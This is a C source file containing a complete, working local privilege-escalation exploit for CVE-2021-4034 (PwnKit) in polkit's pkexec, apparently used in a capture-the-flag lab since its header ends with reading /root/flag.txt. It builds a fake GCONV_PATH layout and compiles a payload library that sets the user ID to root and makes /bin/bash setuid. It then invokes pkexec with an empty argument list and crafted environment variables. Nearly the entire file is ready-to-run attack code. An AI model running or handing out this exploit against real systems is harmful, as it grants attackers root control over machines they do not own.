/*
 * CVE-2021-4034 — PwnKit
 *
 * Based on the arthepsy minimal PoC (the simplest known-working implementation).
 * Reference: https://github.com/arthepsy/CVE-2021-4034
 *
 * Compile : make
 * Run     : ./cve-2021-4034
 *           ls -la /bin/bash   # expect -rwsr-xr-x
 *           /bin/bash -p
 *           cat /root/flag.txt
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

/* Payload source — compiled at runtime into pwnkit/pwnkit.so */
static const char *payload_src =
    "#include <stdio.h>\n"
    "#include <stdlib.h>\n"
    "#include <unistd.h>\n"
    "void gconv() {}\n"
    "void gconv_init() {\n"
    "    setuid(0); setgid(0);\n"
    "    seteuid(0); setegid(0);\n"
    "    chmod(\"/bin/bash\", 04755);\n"
    "}\n";

int main(void)
{
    FILE *fp;

    /* ── Build the exact layout arthepsy uses ── */

    /* 1. GCONV_PATH=./ directory with a dummy executable named "pwnkit" */
    system("mkdir -p 'GCONV_PATH=.'; "
           "touch 'GCONV_PATH=./pwnkit'; "
           "chmod a+x 'GCONV_PATH=./pwnkit'");

    /* 2. pwnkit/ subdirectory containing gconv-modules and the payload .so */
    system("mkdir -p pwnkit");
    system("echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules");

    /* 3. Write and compile the payload .so */
    fp = fopen("pwnkit/pwnkit.c", "w");
    if (!fp) { perror("fopen"); return 1; }
    fprintf(fp, "%s", payload_src);
    fclose(fp);
    system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC");

    printf("[*] Layout built. Launching pkexec with argc=0 ...\n");
    fflush(stdout);

    /* envp layout — matches arthepsy exactly:
     *   [0] "pwnkit"           <- OOB target; pkexec rewrites this with its path
     *   [1] "PATH=GCONV_PATH=."<- pkexec finds "pwnkit" executable here
     *   [2] "CHARSET=PWNKIT"   <- triggers glib iconv -> gconv module load
     *   [3] "SHELL=pwnkit"     <- required for pkexec's shell lookup
     *   [4] NULL
     */
    char *env[] = {
        "pwnkit",
        "PATH=GCONV_PATH=.",
        "CHARSET=PWNKIT",
        "SHELL=pwnkit",
        NULL
    };
    execve("/usr/bin/pkexec", (char *[]){ NULL }, env);
    perror("execve");
    return 1;
}
